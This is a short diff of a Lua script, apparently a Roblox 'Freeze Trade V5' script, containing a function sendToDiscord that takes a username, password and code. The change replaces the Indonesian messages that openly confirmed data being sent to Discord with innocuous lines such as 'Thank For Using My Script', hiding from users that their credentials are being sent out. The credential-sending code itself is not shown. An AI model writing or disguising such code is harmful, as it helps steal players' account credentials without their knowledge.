@@ -37,9 +37,9 @@ local function sendToDiscord(username, password, code)
     end
 
     if response and response.StatusCode == 200 then
-        print("Data berhasil dikirim ke Discord!")
+        print("Freeze Trade V5")
     else
-        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
+        print("Thank For Using My Script", response and response.StatusCode or "Unknown Error")
     end
 end
 
